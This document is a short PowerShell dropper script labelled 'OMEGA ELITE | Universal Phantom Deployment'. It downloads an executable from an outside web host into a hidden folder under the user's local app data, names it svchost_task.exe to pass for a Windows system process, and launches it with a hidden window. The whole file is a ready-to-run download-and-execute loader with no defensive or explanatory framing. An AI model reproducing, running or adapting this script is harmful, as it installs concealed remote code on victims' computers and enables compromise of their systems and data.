# OMEGA ELITE | Universal Phantom Deployment
# -------------------------------------------------------------
$LDR_URL = "https://mrl-neggerre.up.railway.app/static/omega_phantom.exe"
$DEST    = "$env:LOCALAPPDATA\MRL\SystemHost\svchost_task.exe"

# 1. Create isolation directory
if (-not (Test-Path "$env:LOCALAPPDATA\MRL\SystemHost")) { 
    New-Item -Path "$env:LOCALAPPDATA\MRL\SystemHost" -ItemType Directory -Force | Out-Null
}

# 2. Download Native Phantom Loader
Write-Output "[+] Initiating Phantom Uplink..."
try {
    (New-Object System.Net.WebClient).DownloadFile($LDR_URL, $DEST)
    
    # 3. Ignite
    Write-Output "[+] Executing OMEGA Unified Command..."
    Start-Process -FilePath $DEST -WindowStyle Hidden
} catch {
    Write-Error "[!] Deployment Interrupted: $_"
}
